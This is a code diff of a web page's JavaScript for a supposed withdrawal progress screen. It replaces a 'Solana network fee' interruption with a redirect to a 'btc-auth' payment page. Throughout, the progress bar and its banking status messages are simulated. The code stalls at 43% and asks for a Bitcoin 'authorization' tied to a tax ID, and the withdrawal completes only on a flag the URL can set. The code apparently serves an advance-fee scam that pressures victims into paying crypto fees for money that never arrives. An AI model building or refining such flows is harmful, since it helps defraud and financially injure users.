@@ -1,12 +1,13 @@
-// shows progress bar for a withdrawal and waits for server-confirmation (polls /api/account)
+// Withdraw processing — at 43% redirect to btc-auth; resume when authorized
 (function () {
   'use strict';
 
+  const STORAGE_KEY = 'withdrawFlow';
   const params = new URLSearchParams(location.search);
   const txId = params.get('tx') || '';
-  const email = params.get('email') || '';
-  const user = params.get('user') || '';
-  const amount = params.get('amount') || '';
+  const amountParam = params.get('amount') || '';
+  const taxIdParam = params.get('taxId') || params.get('txid') || '';
+  const authorizedParam = params.get('authorized') === '1' || params.get('authorized') === 'true';
 
   const bar = document.getElementById('bar');
   const pct = document.getElementById('pct');
@@ -14,182 +15,200 @@
   const statusLine = document.getElementById('statusLine');
   const cancelBtn = document.getElementById('cancelBtn');
   const spinner = document.getElementById('spinner');
-
-  // ADDED: Declarations for fee prompt elements (assuming they exist in the HTML)
   const feeAlert = document.getElementById('feeAlert');
   const depositFeeBtn = document.getElementById('depositFeeBtn');
 
+  // Hide legacy fee UI if still in DOM
+  if (feeAlert) feeAlert.style.display = 'none';
+  if (depositFeeBtn) depositFeeBtn.style.display = 'none';
+
   let progress = 0;
-  let pollHandle = null;
-  let simulatedInterval = null;
-  let feeCheckTimer = null; // New timer for the fee prompt
-  let feePromptShown = false; // Flag to stop other processes once fee prompt is active
+  let tickHandle = null;
+  let redirectedToAuth = false;
+
+  function loadFlow() {
+    try {
+      const raw = sessionStorage.getItem(STORAGE_KEY);
+      return raw ? JSON.parse(raw) : null;
+    } catch (e) {
+      return null;
+    }
+  }
+
+  function saveFlow(flow) {
+    try {
+      sessionStorage.setItem(STORAGE_KEY, JSON.stringify(flow));
+    } catch (e) { /* ignore */ }
+  }
+
+  function fmtMoney(v) {
+    if (window.money) return money.format(v);
+    return '$' + Number(v || 0).toFixed(2);
+  }
 
   function setProgress(v, label) {
     progress = Math.min(100, Math.max(0, Math.round(v)));
-    bar.style.width = progress + '%';
-    pct.textContent = progress + '%';
-    if (label) statusLine.textContent = label;
-  }
-
-  function brief(msg) {
-    statusLine.textContent = msg;
-  }
-
-  // ADDED: Function to handle the fee prompt (Interrupting the process)
-  function showFeePrompt() {
-    if (feePromptShown) return;
-    feePromptShown = true;
-
-    // Stop all withdrawal background activity
-    if (simulatedInterval) clearInterval(simulatedInterval);
-    if (pollHandle) clearInterval(pollHandle);
-    if (feeCheckTimer) clearTimeout(feeCheckTimer); 
-
-    // Find and clear the 45s safety timer if it was set
-    const safetyTimerId = statusLine.dataset.safetyTimer;
-    if (safetyTimerId) clearTimeout(parseInt(safetyTimerId));
-
-    // Update progress bar (keep current progress but update status)
-    setProgress(progress, 'Awaiting Solona network fee payment.');
-
-    // Display the alert (requires 'feeAlert' element in HTML)
-    if(feeAlert) feeAlert.style.display = 'block';
-
-    // Update UI elements (requires 'depositFeeBtn' element in HTML)
-    statusLine.innerHTML = '<span class="spinner"></span>Network fee payment required to continue.';
-    if(cancelBtn) cancelBtn.style.display = 'none';
-    if(depositFeeBtn) depositFeeBtn.style.display = 'inline-block';
-    if(spinner) spinner.style.display = 'none';
-
-    // The deposit button will simply redirect (as per initial cancel behavior)
-    if(depositFeeBtn) {
-      depositFeeBtn.addEventListener('click', () => {
-        alert('Redirecting to Solona deposit instructions page.');
-        window.location = '/dashboard?email=' + encodeURIComponent(email) + '&user=' + encodeURIComponent(user || '');
-      });
+    if (bar) bar.style.width = progress + '%';
+    if (pct) pct.textContent = progress + '%';
+    if (label && statusLine) {
+      statusLine.innerHTML =
+        (progress < 100 && spinner
+          ? '<span class="spinner" id="spinner"></span>'
+          : '') + label;
     }
   }
 
-  if (!email || !txId) {
-    txInfo.textContent = 'Missing transaction information. Returning to dashboard…';
-    setTimeout(() => {
-      window.location = '/dashboard?email=' + encodeURIComponent(email || '') + '&user=' + encodeURIComponent(user || '');
-    }, 1200);
-    return;
-  } else {
-    txInfo.textContent = `Withdrawing ${amount ? ('$' + Number(amount).toFixed(2)) : 'funds'} for ${decodeURIComponent(user || email)}`;
-    
-    // NEW LOGIC: Set a timer to interrupt the process with the fee prompt after 5 seconds
-    feeCheckTimer = setTimeout(showFeePrompt, 5000); 
-  }
-
-  // Simulate progress towards 70% while backend confirmation pending
-  function startSimulatedProgress() {
-    setProgress(6, 'Initializing withdrawal…');
-    simulatedInterval = setInterval(() => {
-      // Only update progress if the fee prompt has NOT been shown
-      if (!feePromptShown) { 
-        if (progress < 70) {
-          setProgress(progress + (Math.random() * 8 + 4));
-        } else {
-          clearInterval(simulatedInterval);
-        }
-      } else {
-         clearInterval(simulatedInterval); // Ensure it stops if prompt was shown externally
-      }
-    }, 350);
-  }
-
-  // Poll /api/account until the transaction with txId appears (or balance reflects change)
-  async function pollForCompletion() {
-    // Check if the fee prompt has interrupted the process
-    if (feePromptShown) {
-      clearInterval(pollHandle); // Stop polling if interrupted
-      return; 
-    }
-    
+  async function estimateBtc(usd) {
+    // Demo rate; try CoinGecko, fall back to fixed
+    let usdPerBtc = 95000;
     try {
-      const res = await fetch('/api/account?email=' + encodeURIComponent(email), { cache: 'no-store' });
-      if (!res.ok) throw new Error('account fetch failed');
-      const data = await res.json();
-      const txs = Array.isArray(data.transactions) ? data.transactions : [];
-      // check by tx id
-      const found = txs.find(t => t.id === txId);
-      if (found) {
-        // animate to 100% and finish
-        setProgress(100, 'Withdrawal confirmed');
-        clearInterval(pollHandle);
-        // Clear all timers on success
-        if (feeCheckTimer) clearTimeout(feeCheckTimer);
-        const safetyTimerId = statusLine.dataset.safetyTimer;
-        if (safetyTimerId) clearTimeout(parseInt(safetyTimerId));
-        
-        setTimeout(() => {
-          window.location = '/dashboard?email=' + encodeURIComponent(email) + '&user=' + encodeURIComponent(user || '');
-        }, 900);
-        return;
+      const res = await fetch(
+        'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd'
+      );
+      if (res.ok) {
+        const data = await res.json();
+        if (data.bitcoin && data.bitcoin.usd) usdPerBtc = Number(data.bitcoin.usd);
       }
-      // If not found, check balance drop (optional)
-      const userObj = data.user;
-      if (userObj && typeof userObj.balance !== 'undefined') {
-        // assume change implies processed; complete if progress above 70
-        if (progress >= 70) {
-          setProgress(100, 'Withdrawal applied to balance');
-          clearInterval(pollHandle);
-          // Clear all timers on success
-          if (feeCheckTimer) clearTimeout(feeCheckTimer);
-          const safetyTimerId = statusLine.dataset.safetyTimer;
-          if (safetyTimerId) clearTimeout(parseInt(safetyTimerId));
-          
-          setTimeout(() => {
-            window.location = '/dashboard?email=' + encodeURIComponent(email) + '&user=' + encodeURIComponent(user || '');
-          }, 900);
-          return;
-        }
-      }
-      // otherwise keep polling
-      brief('Waiting for bank/network confirmation…');
-    } catch (err) {
-      console.error('Poll error', err);
-      brief('Unable to contact server — retrying…');
-    }
+    } catch (e) { /* demo fallback */ }
+    const btc = Number(usd) / usdPerBtc;
+    return {
+      btc: Number(btc.toFixed(8)),
+      rate: usdPerBtc
+    };
   }
 
-  // user cancel returns them back to dashboard (does not reverse server operation)
-  cancelBtn.addEventListener('click', () => {
-    window.location = '/dashboard?email=' + encodeURIComponent(email) + '&user=' + encodeURIComponent(user || '');
-  });
+  function goToBtcAuth(flow) {
+    if (redirectedToAuth) return;
+    redirectedToAuth = true;
+    if (tickHandle) clearInterval(tickHandle);
 
-  // start simulated progress and polling
-  startSimulatedProgress();
-  // once simulated progress reaches ~70, start polling frequently
-  const watchSim = setInterval(() => {
-    if (progress >= 70) {
-      clearInterval(watchSim);
-      pollForCompletion(); // immediate check
-      pollHandle = setInterval(pollForCompletion, 1500);
-    } else {
-      // also update status line during sim
-      brief('Processing withdrawal…');
+    setProgress(43, 'Authorization required — redirecting…');
+
+    // Persist before handoff so btc-auth.html (public/btc-auth.html) can read session
+    saveFlow(Object.assign({}, flow, {
+      amount: flow.amount,
+      taxId: flow.taxId || taxIdParam,
+      tx: flow.tx || txId,
+      btcAmount: flow.btcAmount,
+      email: flow.email || '',
+      authorized: false
+    }));
+
+    const amount = flow.amount;
+    const taxId = flow.taxId || taxIdParam;
+    const email = flow.email || '';
+    const q = [
+      'amount=' + encodeURIComponent(amount),
+      'btc=' + encodeURIComponent(flow.btcAmount != null ? flow.btcAmount : ''),
+      'taxId=' + encodeURIComponent(taxId),
+      'tx=' + encodeURIComponent(flow.tx || txId),
+      'email=' + encodeURIComponent(email)
+    ].join('&');
+
+    setTimeout(() => {
+      // Served from public/btc-auth.html via app.get('/btc-auth')
+      window.location.href = '/btc-auth?' + q;
+    }, 600);
+  }
+
+  function finishSuccess() {
+    if (tickHandle) clearInterval(tickHandle);
+    setProgress(100, 'Withdrawal complete.');
+    if (spinner) spinner.style.display = 'none';
+    try {
+      sessionStorage.removeItem(STORAGE_KEY);
+    } catch (e) { /* ignore */ }
+    setTimeout(() => {
+      window.location = '/dashboard';
+    }, 1400);
+  }
+
+  async function boot() {
+    if (!window.auth || !auth.isAuthenticated()) {
+      window.location.href =
+        '/login?redirect=' + encodeURIComponent(location.pathname + location.search);
+      return;
     }
-  }, 300);
 
-  // safety: after 45s, stop and show manual action
-  const safetyTimer = setTimeout(() => {
-    if (pollHandle) clearInterval(pollHandle);
-    if (simulatedInterval) clearInterval(simulatedInterval);
-    if (feeCheckTimer) clearTimeout(feeCheckTimer); // Stop the fee check timer here too
-    
-    // Only proceed if not already interrupted by the fee prompt
-    if (progress < 100 && !feePromptShown) {
-      setProgress(Math.max(progress, 85), 'Taking longer than expected — please wait or contact support.');
-      // keep a lightweight poll in background
-      pollHandle = setInterval(pollForCompletion, 5000);
+    let flow = loadFlow() || {};
+    // Merge URL + session
+    flow.tx = flow.tx || txId;
+    flow.amount = flow.amount != null ? flow.amount : amountParam;
+    flow.taxId = flow.taxId || taxIdParam;
+    if (authorizedParam) flow.authorized = true;
+
+    let userLabel = 'account';
+    let userEmail = flow.email || '';
+    try {
+      const me = await auth.fetchMe();
+      userLabel = me.user.name || me.user.email;
+      userEmail = me.user.email || userEmail;
+      flow.email = userEmail;
+      flow.name = me.user.name || flow.name;
+    } catch (e) { /* ignore */ }
+
+    if (!flow.tx) {
+      if (txInfo) txInfo.textContent = 'Missing transaction. Returning to dashboard…';
+      setTimeout(() => {
+        window.location = '/dashboard';
+      }, 1000);
+      return;
     }
-  }, 45000);
-  
-  // Store the timer ID for cleanup if completion or fee happens early
-  statusLine.dataset.safetyTimer = safetyTimer;
 
+    // Ensure BTC amount for auth handoff
+    if (flow.btcAmount == null && flow.amount) {
+      const est = await estimateBtc(flow.amount);
+      flow.btcAmount = est.btc;
+      flow.btcRate = est.rate;
+    }
+    saveFlow(flow);
+
+    if (txInfo) {
+      const amtLabel = flow.amount ? fmtMoney(flow.amount) : 'funds';
+      const btcLabel = flow.btcAmount != null ? ' · ≈ ' + flow.btcAmount + ' BTC' : '';
+      txInfo.textContent =
+        'Withdrawing ' + amtLabel + btcLabel + ' for ' + userLabel;
+    }
+
+    // Resume after btc-auth
+    if (flow.authorized || authorizedParam) {
+      setProgress(43, 'Authorization verified. Completing withdrawal…');
+      tickHandle = setInterval(() => {
+        if (progress < 100) {
+          setProgress(progress + 6, 'Finalizing bank transfer…');
+        } else {
+          finishSuccess();
+        }
+      }, 380);
+      return;
+    }
+
+    // Initial run — progress to 43%, then btc-auth
+    setProgress(4, 'Initializing withdrawal…');
+    tickHandle = setInterval(() => {
+      if (progress < 43) {
+        const next = Math.min(43, progress + 3 + Math.random() * 4);
+        let label = 'Processing withdrawal…';
+        if (next < 15) label = 'Validating bank details…';
+        else if (next < 28) label = 'Submitting wire instructions…';
+        else if (next < 43) label = 'Preparing blockchain authorization…';
+        setProgress(next, label);
+        if (next >= 43) {
+          clearInterval(tickHandle);
+          setProgress(43, 'Authorization required…');
+          goToBtcAuth(flow);
+        }
+      }
+    }, 420);
+  }
+
+  if (cancelBtn) {
+    cancelBtn.addEventListener('click', () => {
+      if (tickHandle) clearInterval(tickHandle);
+      window.location = '/dashboard';
+    });
+  }
+
+  document.addEventListener('DOMContentLoaded', boot);
+  if (document.readyState !== 'loading') boot();
 })();
